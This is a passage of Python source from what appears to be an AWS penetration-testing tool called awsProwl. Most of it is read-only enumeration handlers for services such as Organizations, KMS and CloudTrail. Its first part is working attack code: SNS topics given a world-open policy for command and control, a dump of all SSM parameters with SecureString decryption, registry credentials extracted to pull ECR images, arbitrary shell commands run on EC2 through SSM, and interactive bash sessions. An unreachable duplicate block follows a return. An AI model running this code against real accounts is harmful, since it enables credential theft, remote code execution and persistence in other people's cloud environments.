            "resource_type": "sns_subscription",
            "resource_id": subscription_arn,
            "resource_name": f"{topic_arn.split(':')[-1]}:{protocol}",
            "region": client.meta.region_name,
            "rule_id": "sns_exploit_subscribe",
            "details": {"topic_arn": topic_arn, "protocol": protocol, "endpoint": endpoint, "subscription_arn": subscription_arn},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("sns_exploit_subscribe", e)

    return findings


async def run_sns_exploit_publish(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Publish message to SNS topic for notification spam or command injection."""
    findings = []
    client = auth_manager.get_client("sns")

    topic_arn = kwargs.get("topic_arn")
    message = kwargs.get("message", "{\"command\": \"execute\", \"payload\": \"awsProwl test\"}")
    subject = kwargs.get("subject", "awsProwl Notification")
    message_attributes = kwargs.get("message_attributes", {})

    if not topic_arn:
        # List topics
        try:
            paginator = client.get_paginator("list_topics")
            for page in paginator.paginate():
                for topic in page.get("Topics", []):
                    findings.append({
                        "title": f"SNS Topic Available: {topic['TopicArn']}",
                        "description": f"Topic ARN: {topic['TopicArn']}",
                        "severity": "info",
                        "category": "reconnaissance",
                        "resource_type": "sns_topic",
                        "resource_id": topic["TopicArn"],
                        "resource_name": topic["TopicArn"].split(":")[-1],
                        "region": client.meta.region_name,
                        "rule_id": "sns_exploit_publish_list",
                        "details": topic,
                    })
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("sns:ListTopics", e)
        return findings

    try:
        response = client.publish(
            TopicArn=topic_arn,
            Message=message,
            Subject=subject,
            MessageAttributes=message_attributes
        )

        message_id = response.get("MessageId", "unknown")

        findings.append({
            "title": f"SNS Message Published: {message_id}",
            "description": f"Topic: {topic_arn}\nSubject: {subject}\nMessage: {message[:200]}...\nMessage ID: {message_id}\n\nMessage delivered to all subscribers.",
            "severity": "medium",
            "category": "collection",
            "resource_type": "sns_message",
            "resource_id": message_id,
            "resource_name": f"Message:{message_id}",
            "region": client.meta.region_name,
            "rule_id": "sns_exploit_publish",
            "details": {"topic_arn": topic_arn, "message_id": message_id, "subject": subject},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("sns_exploit_publish", e)

    return findings


async def run_sns_exploit_create_topic(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create SNS topic for malicious notification routing."""
    findings = []
    client = auth_manager.get_client("sns")

    name = kwargs.get("name", f"awsprowl-topic-{int(datetime.now().timestamp())}")
    display_name = kwargs.get("display_name", "awsProwl Topic")
    fifo = kwargs.get("fifo", False)
    policy = kwargs.get("policy")

    try:
        create_kwargs = {
            "Name": name,
            "Attributes": {
                "DisplayName": display_name,
                "FifoTopic": str(fifo).lower()
            }
        }
        if policy:
            create_kwargs["Attributes"]["Policy"] = policy
        elif fifo:
            create_kwargs["Name"] = name + ".fifo"

        response = client.create_topic(**create_kwargs)
        topic_arn = response["TopicArn"]

        # Set permissive policy if not FIFO
        if not fifo and not policy:
            permissive_policy = {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": "*",
                        "Action": ["SNS:Publish", "SNS:Subscribe"],
                        "Resource": topic_arn
                    }
                ]
            }
            import json
            client.set_topic_attributes(
                TopicArn=topic_arn,
                AttributeName="Policy",
                AttributeValue=json.dumps(permissive_policy)
            )

        findings.append({
            "title": f"SNS Topic Created: {topic_arn}",
            "description": f"Name: {name}\nDisplay Name: {display_name}\nFIFO: {fifo}\nPolicy: {'Custom' if policy else 'Permissive (allow all)'}\n\nTopic can be used for notification routing, command & control, or data exfiltration.",
            "severity": "high",
            "category": "persistence",
            "resource_type": "sns_topic",
            "resource_id": topic_arn,
            "resource_name": name,
            "region": client.meta.region_name,
            "rule_id": "sns_exploit_create_topic",
            "details": {"topic_arn": topic_arn, "name": name, "fifo": fifo},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("sns_exploit_create_topic", e)

    return findings


# ACM PROWL parity handlers
async def run_acm_enum_certificates(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "acm_enum_certificates", "Enumerate ACM certificates (public and private).")


async def run_acm_enum_certificate_details(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "acm_enum_certificate_details", "Enumerate detailed certificate information (domains, SANs, validity, key algorithm).")


# ECR PROWL parity handlers
async def run_ecr_enum_repositories(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "ecr_enum_repositories", "Enumerate ECR repositories, images, and scan findings.")


async def run_ecr_enum_pull_through_cache(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "ecr_enum_pull_through_cache", "Enumerate ECR pull-through cache rules.")


async def run_ecr_exfil_pull_images(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Pull ECR container images for analysis/extraction."""
    findings = []
    ecr_client = auth_manager.get_client("ecr")

    repository_name = kwargs.get("repository_name")
    if not repository_name:
        # List repositories
        try:
            paginator = ecr_client.get_paginator("describe_repositories")
            for page in paginator.paginate():
                for repo in page.get("repositories", []):
                    findings.append({
                        "title": f"ECR Repository Available: {repo['repositoryName']}",
                        "description": f"URI: {repo['repositoryUri']}\nCreated: {repo.get('createdAt')}",
                        "severity": "info",
                        "category": "reconnaissance",
                        "resource_type": "ecr_repository",
                        "resource_id": repo["repositoryName"],
                        "resource_name": repo["repositoryName"],
                        "region": ecr_client.meta.region_name,
                        "rule_id": "ecr_exfil_pull_images_list",
                        "details": repo,
                    })
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("ecr:DescribeRepositories", e)
        return findings

    # List images in repository
    try:
        paginator = ecr_client.get_paginator("list_images")
        images = []
        for page in paginator.paginate(repositoryName=repository_name):
            images.extend(page.get("imageIds", []))

        if not images:
            findings.append({
                "title": f"No Images in Repository: {repository_name}",
                "description": "Repository exists but contains no images",
                "severity": "info",
                "category": "informational",
                "resource_type": "ecr_repository",
                "resource_id": repository_name,
                "resource_name": repository_name,
                "region": ecr_client.meta.region_name,
                "rule_id": "ecr_exfil_pull_images_empty",
            })
            return findings

        # Get authorization token for docker login
        auth_response = ecr_client.get_authorization_token()
        auth_data = auth_response["authorizationData"][0]
        import base64
        token = base64.b64decode(auth_data["authorizationToken"]).decode()
        username, password = token.split(":", 1)
        registry = auth_data["proxyEndpoint"]

        findings.append({
            "title": f"ECR Images Available for Pull: {repository_name}",
            "description": f"Repository: {repository_name}\nImages: {len(images)}\nRegistry: {registry}\nUsername: {username}\nPassword: [REDACTED]\n\nUse these credentials with docker:\n  docker login -u {username} -p [PASSWORD] {registry}\n  docker pull {repository_name}:<tag>",
            "severity": "high",
            "category": "data_exfiltration",
            "resource_type": "ecr_repository",
            "resource_id": repository_name,
            "resource_name": repository_name,
            "region": ecr_client.meta.region_name,
            "rule_id": "ecr_exfil_pull_images",
            "details": {"repository_name": repository_name, "image_count": len(images), "registry": registry, "username": username, "images": images[:10]},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("ecr_exfil_pull_images", e)

    return findings


# SSM Extended PROWL parity handlers
async def run_ssm_exfil_download_parameters(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Download all SSM Parameter Store parameters (including SecureString) for credential extraction."""
    findings = []
    client = auth_manager.get_client("ssm")

    path = kwargs.get("path", "/")
    recursive = kwargs.get("recursive", True)
    with_decryption = kwargs.get("with_decryption", True)

    try:
        paginator = client.get_paginator("get_parameters_by_path")
        all_params = []
        for page in paginator.paginate(Path=path, Recursive=recursive, WithDecryption=with_decryption):
            all_params.extend(page.get("Parameters", []))

        if not all_params:
            findings.append({
                "title": f"No SSM Parameters Found at Path: {path}",
                "description": f"Path: {path}\nRecursive: {recursive}\nWith Decryption: {with_decryption}",
                "severity": "info",
                "category": "informational",
                "resource_type": "ssm_parameter",
                "resource_id": path,
                "resource_name": path,
                "region": client.meta.region_name,
                "rule_id": "ssm_exfil_download_parameters_none",
            })
            return findings

        # Separate secure strings
        secure_strings = [p for p in all_params if p.get("Type") == "SecureString"]
        string_params = [p for p in all_params if p.get("Type") == "String"]
        string_list_params = [p for p in all_params if p.get("Type") == "StringList"]

        findings.append({
            "title": f"SSM Parameters Exfiltrated: {len(all_params)} parameters from {path}",
            "description": f"Total: {len(all_params)}\nSecureString (decrypted): {len(secure_strings)}\nString: {len(string_params)}\nStringList: {len(string_list_params)}\nWith Decryption: {with_decryption}\n\nSample parameters:\n" + "\n".join([f"  {p['Name']}: {p.get('Value', '[REDACTED]')[:50]}" for p in all_params[:10]]),
            "severity": "critical" if secure_strings else "high",
            "category": "credential_access",
            "resource_type": "ssm_parameter_store",
            "resource_id": path,
            "resource_name": f"Parameters under {path}",
            "region": client.meta.region_name,
            "rule_id": "ssm_exfil_download_parameters",
            "details": {"path": path, "total": len(all_params), "secure_count": len(secure_strings), "parameters": all_params},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("ssm_exfil_download_parameters", e)

    return findings


async def run_ssm_exploit_rce_ec2(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Execute commands on EC2 instances via SSM SendCommand/RunCommand for remote code execution."""
    findings = []
    client = auth_manager.get_client("ssm")

    instance_ids = kwargs.get("instance_ids", [])
    if not instance_ids:
        # Try to find instances managed by SSM
        try:
            paginator = client.get_paginator("describe_instance_information")
            for page in paginator.paginate():
                for info in page.get("InstanceInformationList", []):
                    instance_ids.append(info["InstanceId"])
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("ssm:DescribeInstanceInformation", e)

    if not instance_ids:
        findings.append({
            "title": "No SSM-Managed Instances Found",
            "description": "No EC2 instances are managed by SSM in this account/region",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_instances",
            "resource_name": "No instances",
            "region": client.meta.region_name,
            "rule_id": "ssm_exploit_rce_ec2_no_instances",
        })
        return findings

    # Command to execute
    command = kwargs.get("command", "id && whoami && hostname")
    document_name = kwargs.get("document_name", "AWS-RunShellScript")
    timeout = kwargs.get("timeout", 3600)
    working_directory = kwargs.get("working_directory", "/tmp")

    for instance_id in instance_ids:
        try:
            response = client.send_command(
                InstanceIds=[instance_id],
                DocumentName=document_name,
                Parameters={"commands": [command], "workingDirectory": [working_directory]},
                TimeoutSeconds=timeout,
            )

            command_id = response["Command"]["CommandId"]

            # Wait for command to complete
            import asyncio
            await asyncio.sleep(3)

            # Get command invocation
            invocation = client.get_command_invocation(CommandId=command_id, InstanceId=instance_id)

            findings.append({
                "title": f"SSM Command Executed: {command_id}",
                "description": f"Instance: {instance_id}\nCommand: {command}\nStatus: {invocation['Status']}\nOutput:\n{invocation.get('StandardOutputContent', '')[:500]}\nError:\n{invocation.get('StandardErrorContent', '')[:500]}",
                "severity": "critical" if invocation["Status"] == "Success" else "high",
                "category": "remote_code_execution",
                "resource_type": "ssm_command",
                "resource_id": command_id,
                "resource_name": f"{instance_id}:{command_id}",
                "region": client.meta.region_name,
                "rule_id": "ssm_exploit_rce_ec2",
                "details": {"instance_id": instance_id, "command_id": command_id, "command": command, "status": invocation["Status"], "output": invocation.get("StandardOutputContent", "")[:1000]},
            })

        except botocore.exceptions.ClientError as e:
            findings.append(_handle_aws_error(f"ssm_exploit_rce_ec2:{instance_id}", e)[0])

    return findings


async def run_ssm_exploit_session_manager(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Start SSM Session Manager session for interactive shell on EC2 instance."""
    findings = []
    ssm_client = auth_manager.get_client("ssm")

    instance_id = kwargs.get("instance_id")
    if not instance_id:
        # List managed instances
        try:
            paginator = ssm_client.get_paginator("describe_instance_information")
            for page in paginator.paginate():
                for instance in page.get("InstanceInformationList", []):
                    findings.append({
                        "title": f"SSM Managed Instance: {instance['InstanceId']}",
                        "description": f"Platform: {instance.get('PlatformType')}\nAgent: {instance.get('AgentVersion')}\nStatus: {instance.get('PingStatus')}\nLast Ping: {instance.get('LastPingDateTime')}",
                        "severity": "info",
                        "category": "reconnaissance",
                        "resource_type": "ec2_instance",
                        "resource_id": instance["InstanceId"],
                        "resource_name": instance["InstanceId"],
                        "region": ssm_client.meta.region_name,
                        "rule_id": "ssm_exploit_session_manager_list",
                        "details": instance,
                    })
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("ssm:DescribeInstanceInformation", e)
        return findings

    target = kwargs.get("target", instance_id)
    document_name = kwargs.get("document_name", "AWS-StartInteractiveCommand")
    parameters = kwargs.get("parameters", {"command": ["bash -i"]})

    try:
        response = ssm_client.start_session(
            Target=target,
            DocumentName=document_name,
            Parameters=parameters
        )

        session_id = response["SessionId"]
        stream_url = response.get("StreamUrl", "")
        token_value = response.get("TokenValue", "")

        findings.append({
            "title": f"SSM Session Manager Session Started: {session_id}",
            "description": f"Instance: {instance_id}\nDocument: {document_name}\nSession ID: {session_id}\nStream URL: {stream_url}\nToken: [REDACTED]\n\nInteractive shell established on target instance via SSM.",
            "severity": "critical",
            "category": "remote_access",
            "resource_type": "ssm_session",
            "resource_id": session_id,
            "resource_name": f"Session:{session_id}",
            "region": ssm_client.meta.region_name,
            "rule_id": "ssm_exploit_session_manager",
            "details": {"instance_id": instance_id, "session_id": session_id, "document_name": document_name},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("ssm_exploit_session_manager", e)

    return findings

    for instance_id in instance_ids:
        try:
            # Send command via SSM
            response = client.send_command(
                InstanceIds=[instance_id],
                DocumentName=document_name,
                Parameters={
                    "commands": [command],
                    "workingDirectory": [working_directory]
                } if document_name == "AWS-RunShellScript" else {
                    "commands": [command]
                },
                TimeoutSeconds=timeout,
                Comment=f"awsProwl RCE via SSM - authorized testing"
            )

            command_id = response["Command"]["CommandId"]

            # Wait for command to complete
            import asyncio
            await asyncio.sleep(2)

            # Get command output
            output_response = client.get_command_invocation(
                CommandId=command_id,
                InstanceId=instance_id
            )

            findings.append({
                "title": f"SSM Command Executed: {instance_id}",
                "description": f"Command: {command}\nStatus: {output_response.get('Status', 'Unknown')}\nOutput:\n{output_response.get('StandardOutputContent', 'No output')[:2000]}",
                "severity": "critical" if output_response.get("Status") == "Success" else "high",
                "category": "remote_code_execution",
                "resource_type": "ec2_instance",
                "resource_id": instance_id,
                "resource_name": instance_id,
                "region": client.meta.region_name,
                "rule_id": "ssm_exploit_rce_ec2",
                "details": {
                    "command_id": command_id,
                    "command": command,
                    "status": output_response.get("Status"),
                    "standard_output": output_response.get("StandardOutputContent", "")[:5000],
                    "standard_error": output_response.get("StandardErrorContent", "")[:2000],
                },
            })

        except botocore.exceptions.ClientError as e:
            findings.append(_handle_aws_error(f"ssm_exploit_rce_ec2:{instance_id}", e)[0])

    return findings


# ============================================================================
# ENUM MODULE HANDLERS (Read-only enumeration - PROWL parity implementations)
# ============================================================================

# --- Organizations ENUM Handlers ---

async def run_organizations_enum_accounts(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate AWS Organization accounts."""
    from awsprowl.aws.organizations import OrganizationsScanner
    scanner = OrganizationsScanner(auth_manager)
    findings = []
    try:
        await scanner._scan_accounts("tui-organizations-enum-accounts", findings, _create_scan_result("organizations"))
    except Exception as e:
        return _handle_aws_error("organizations:ListAccounts", e)
    return findings


async def run_organizations_enum_roots_ous(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate AWS Organization roots and organizational units."""
    from awsprowl.aws.organizations import OrganizationsScanner
    scanner = OrganizationsScanner(auth_manager)
    findings = []
    try:
        await scanner._scan_roots("tui-organizations-enum-roots-ous", findings, _create_scan_result("organizations"))
        await scanner._scan_organizational_units("tui-organizations-enum-roots-ous", findings, _create_scan_result("organizations"))
    except Exception as e:
        return _handle_aws_error("organizations:ListRoots/ListOrganizationalUnitsForParent", e)
    return findings


async def run_organizations_enum_policies(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate AWS Organization policies (SCPs, Tag policies, etc.)."""
    from awsprowl.aws.organizations import OrganizationsScanner
    scanner = OrganizationsScanner(auth_manager)
    findings = []
    try:
        await scanner._scan_policies("tui-organizations-enum-policies", findings, _create_scan_result("organizations"))
    except Exception as e:
        return _handle_aws_error("organizations:ListPolicies/DescribePolicy", e)
    return findings


async def run_organizations_enum_delegated_admins(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate AWS Organization delegated administrators."""
    from awsprowl.aws.organizations import OrganizationsScanner
    scanner = OrganizationsScanner(auth_manager)
    findings = []
    try:
        await scanner._scan_delegated_administrators("tui-organizations-enum-delegated-admins", findings, _create_scan_result("organizations"))
    except Exception as e:
        return _handle_aws_error("organizations:ListDelegatedAdministrators", e)
    return findings


async def run_organizations_enum_handshakes(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate AWS Organization handshakes (invitations)."""
    from awsprowl.aws.organizations import OrganizationsScanner
    scanner = OrganizationsScanner(auth_manager)
    findings = []
    try:
        # List handshakes for the organization
        paginator = scanner.client.get_paginator("list_handshakes_for_organization")
        for page in paginator.paginate():
            for handshake in page.get("Handshakes", []):
                findings.append({
                    "title": f"Handshake: {handshake.get('Id', 'Unknown')}",
                    "description": f"Action: {handshake.get('Action', 'N/A')}, State: {handshake.get('State', 'N/A')}, Requester: {handshake.get('RequesterEmail', 'N/A')}",
                    "severity": "info",
                    "category": "informational",
                    "resource_type": "organizations_handshake",
                    "resource_id": handshake.get("Id", "unknown"),
                    "resource_name": handshake.get("Id", "unknown"),
                    "region": "global",
                    "rule_id": "organizations_enum_handshakes",
                })
    except Exception as e:
        return _handle_aws_error("organizations:ListHandshakesForOrganization", e)
    return findings


# --- STS ENUM Handlers ---

async def run_sts_enum_identity(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate STS/Account identity and settings."""
    from awsprowl.aws.sts import STSScanner
    scanner = STSScanner(auth_manager)
    findings = []
    try:
        await scanner._scan_account_settings("tui-sts-enum-identity", findings, _create_scan_result("sts"))
    except Exception as e:
        return _handle_aws_error("sts:GetCallerIdentity/iam:GetAccountSummary", e)
    return findings


# --- RDS ENUM Handlers ---

async def run_rds_enum_instances(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate RDS instances."""
    from awsprowl.aws.rds import RDSScanner
    scanner = RDSScanner(auth_manager)
    findings = []
    try:
        await scanner._scan_instances("tui-rds-enum-instances", findings, _create_scan_result("rds"))
    except Exception as e:
        return _handle_aws_error("rds:DescribeDBInstances", e)
    return findings


# --- DynamoDB ENUM Handlers ---

async def run_dynamodb_enum_tables(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate DynamoDB tables."""
    from awsprowl.aws.dynamodb import DynamoDBScanner
    scanner = DynamoDBScanner(auth_manager)
    findings = []
    try:
        await scanner._scan_tables("tui-dynamodb-enum-tables", findings, _create_scan_result("dynamodb"))
    except Exception as e:
        return _handle_aws_error("dynamodb:ListTables/DescribeTable", e)
    return findings


# --- ECS ENUM Handlers ---

async def run_ecs_enum_clusters(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate ECS clusters."""
    from awsprowl.aws.ecs import ECSScanner
    scanner = ECSScanner(auth_manager)
    findings = []
    try:
        await scanner._scan_clusters("tui-ecs-enum-clusters", findings, _create_scan_result("ecs"))
    except Exception as e:
        return _handle_aws_error("ecs:ListClusters/DescribeClusters", e)
    return findings


# --- EKS ENUM Handlers ---

async def run_eks_enum_clusters(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate EKS clusters."""
    from awsprowl.aws.eks import EKSScanner
    scanner = EKSScanner(auth_manager)
    findings = []
    try:
        await scanner._scan_clusters("tui-eks-enum-clusters", findings, _create_scan_result("eks"))
    except Exception as e:
        return _handle_aws_error("eks:ListClusters/DescribeCluster", e)
    return findings


async def run_eks_enum_addons(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate EKS addons across all clusters."""
    from awsprowl.aws.eks import EKSScanner
    scanner = EKSScanner(auth_manager)
    findings = []
    try:
        # First get all clusters
        clusters_response = scanner.client.list_clusters()
        cluster_names = clusters_response.get("clusters", [])

        for cluster_name in cluster_names:
            await scanner._scan_addons(cluster_name, "tui-eks-enum-addons", findings)
    except Exception as e:
        return _handle_aws_error("eks:ListAddons/DescribeAddon", e)
    return findings


async def run_eks_enum_identity_providers(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate EKS identity providers (OIDC) across all clusters."""
    from awsprowl.aws.eks import EKSScanner
    scanner = EKSScanner(auth_manager)
    findings = []
    try:
        # First get all clusters
        clusters_response = scanner.client.list_clusters()
        cluster_names = clusters_response.get("clusters", [])

        for cluster_name in cluster_names:
            await scanner._scan_identity_providers(cluster_name, "tui-eks-enum-identity-providers", findings)
    except Exception as e:
        return _handle_aws_error("eks:ListIdentityProviderConfigs/DescribeIdentityProviderConfig", e)
    return findings


# --- Secrets Manager ENUM Handlers ---

async def run_secretsmanager_enum_secrets(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate Secrets Manager secrets."""
    from awsprowl.aws.secrets import SecretsScanner
    scanner = SecretsScanner(auth_manager)
    findings = []
    try:
        await scanner._scan_secrets("tui-secretsmanager-enum-secrets", findings, _create_scan_result("secretsmanager"))
    except Exception as e:
        return _handle_aws_error("secretsmanager:ListSecrets/DescribeSecret", e)
    return findings


# --- CloudTrail ENUM Handlers ---

async def run_cloudtrail_enum_trails(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate CloudTrail trails."""
    scanner = auth_manager.get_client("cloudtrail")
    findings = []
    try:
        response = scanner.describe_trails()
        for trail in response.get("trailList", []):
            findings.append({
                "title": f"CloudTrail Trail: {trail.get('Name', 'Unknown')}",
                "description": f"ARN: {trail.get('TrailARN', 'N/A')}, HomeRegion: {trail.get('HomeRegion', 'N/A')}, IsMultiRegion: {trail.get('IsMultiRegionTrail', False)}, LogFileValidation: {trail.get('LogFileValidationEnabled', False)}",
                "severity": "info",
                "category": "informational",
                "resource_type": "cloudtrail_trail",
                "resource_id": trail.get("Name", "unknown"),
                "resource_name": trail.get("Name", "unknown"),
                "region": trail.get("HomeRegion", "global"),
                "rule_id": "cloudtrail_enum_trails",
            })
    except Exception as e:
        return _handle_aws_error("cloudtrail:DescribeTrails", e)
    return findings


async def run_cloudtrail_enum_event_data_stores(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate CloudTrail Event Data Stores (Lake)."""
    scanner = auth_manager.get_client("cloudtrail")
    findings = []
    try:
        paginator = scanner.get_paginator("list_event_data_stores")
        for page in paginator.paginate():
            for eds in page.get("EventDataStores", []):
                findings.append({
                    "title": f"Event Data Store: {eds.get('Name', 'Unknown')}",
                    "description": f"ARN: {eds.get('EventDataStoreArn', 'N/A')}, Status: {eds.get('Status', 'N/A')}, Retention: {eds.get('RetentionPeriod', 'N/A')} days",
                    "severity": "info",
                    "category": "informational",
                    "resource_type": "cloudtrail_event_data_store",
                    "resource_id": eds.get("EventDataStoreArn", "unknown"),
                    "resource_name": eds.get("Name", "unknown"),
                    "region": scanner.meta.region_name,
                    "rule_id": "cloudtrail_enum_event_data_stores",
                })
    except Exception as e:
        return _handle_aws_error("cloudtrail:ListEventDataStores", e)
    return findings


async def run_cloudtrail_enum_channels(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate CloudTrail Channels (for external event ingestion)."""
    scanner = auth_manager.get_client("cloudtrail")
    findings = []
    try:
        paginator = scanner.get_paginator("list_channels")
        for page in paginator.paginate():
            for channel in page.get("Channels", []):
                findings.append({
                    "title": f"CloudTrail Channel: {channel.get('Name', 'Unknown')}",
                    "description": f"ARN: {channel.get('ChannelArn', 'N/A')}, Source: {channel.get('Source', 'N/A')}, Status: {channel.get('Status', 'N/A')}",
                    "severity": "info",
                    "category": "informational",
                    "resource_type": "cloudtrail_channel",
                    "resource_id": channel.get("ChannelArn", "unknown"),
                    "resource_name": channel.get("Name", "unknown"),
                    "region": scanner.meta.region_name,
                    "rule_id": "cloudtrail_enum_channels",
                })
    except Exception as e:
        return _handle_aws_error("cloudtrail:ListChannels", e)
    return findings


# --- KMS ENUM Handlers ---

async def run_kms_enum_keys(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate KMS keys."""
    from awsprowl.aws.kms import KMSScanner
    scanner = KMSScanner(auth_manager)
    findings = []
    try:
        await scanner._scan_keys("tui-kms-enum-keys", findings, _create_scan_result("kms"))
    except Exception as e:
        return _handle_aws_error("kms:ListKeys/DescribeKey", e)
    return findings


async def run_kms_enum_aliases(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate KMS aliases."""
    from awsprowl.aws.kms import KMSScanner
    scanner = KMSScanner(auth_manager)
    findings = []
    try:
        await scanner._scan_aliases("tui-kms-enum-aliases", findings, _create_scan_result("kms"))
    except Exception as e:
        return _handle_aws_error("kms:ListAliases", e)
    return findings


async def run_kms_enum_grants(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate KMS grants for all keys."""
    from awsprowl.aws.kms import KMSScanner
    scanner = KMSScanner(auth_manager)
    findings = []
    try:
        # First get all keys
        paginator = scanner.client.get_paginator("list_keys")
        for page in paginator.paginate():
            for key in page.get("Keys", []):
                key_id = key["KeyId"]
                grants_paginator = scanner.client.get_paginator("list_grants")
                for grants_page in grants_paginator.paginate(KeyId=key_id):
                    for grant in grants_page.get("Grants", []):
                        findings.append({
                            "title": f"KMS Grant: {grant.get('GrantId', 'Unknown')}",
                            "description": f"Key: {key_id}, Grantee: {grant.get('GranteePrincipal', 'N/A')}, Operations: {', '.join(grant.get('Operations', []))}, Retiring: {grant.get('RetiringPrincipal', 'N/A')}",
                            "severity": "info",
                            "category": "informational",
                            "resource_type": "kms_grant",
                            "resource_id": grant.get("GrantId", "unknown"),
                            "resource_name": f"Grant on {key_id}",
                            "region": scanner.region,
                            "rule_id": "kms_enum_grants",
                        })
    except Exception as e:
        return _handle_aws_error("kms:ListGrants", e)
    return findings


# --- SNS ENUM Handlers ---

async def run_sns_enum_topics(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Enumerate SNS topics."""
    from awsprowl.aws.sns import SNSScanner
    scanner = SNSScanner(auth_manager)
    findings = []
    try:
        await scanner._scan_topics("tui-sns-enum-topics", findings, _create_scan_result("sns"))
    except Exception as e:
        return _handle_aws_error("sns:ListTopics/GetTopicAttributes", e)
    return findings